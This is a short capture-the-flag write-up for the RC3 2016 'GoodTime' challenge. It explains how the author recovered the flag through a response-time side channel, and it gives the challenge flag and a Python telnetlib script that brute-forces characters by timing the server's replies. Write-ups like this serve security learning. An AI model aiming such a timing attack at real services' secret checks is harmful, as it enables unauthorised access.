# GoodTime (misc 150)
I try to send something to the server, and I feel weird when I send RC3. It seems that it takes a longer time to response. So I try to use the side channel to recover the flag. This attack requires a stable network connection because any internet problems may lead to the incorrect estimation of response time. I fail several times on my laptop with wifi, and then I move on to workstation. It works!  
The code to attack is quiet simple.  
It can be faster to stop when the response time is 0.2 more than previous, but it's still slow when the string is too long. It takes about ten seconds per query when we nearly solve it. So, we manually guess the possible char and get the flag.  
flag: RC3-2016-itz-alw4yz-a-g00d-t1m1ng-@tt@ck
```
import datetime
import telnetlib

SERVER = 'goodtime.ctf.rc3.club'
PORT = '5866'

def time_interval(conn, param):
    start = datetime.datetime.now()
    conn.write(param)
    ret = conn.read_until(b'\n').strip()
    end = datetime.datetime.now()
    interval = end - start
    return interval.total_seconds(), ret


def guess(x):
    conn = telnetlib.Telnet(SERVER, PORT)
    conn.read_until(b': ')
    t, ret = time_interval(conn, x + b'\n')
    print('\rguessing', x.decode('utf8'), t, end='')
    return t, ret
def sidechannel_attack():
    plain_text = b''
    halt = False
    while not halt:
        hit = max([(guess(plain_text + bytes([x])), x) for x in range(33, 128)], key=lambda x: x[0][0])
        print('')
        halt = (hit[0][1] != b'Nope')
        plain_text += bytes([hit[1]])
        print(plain_text.decode('utf8'), hit[0][0])

sidechannel_attack()
```
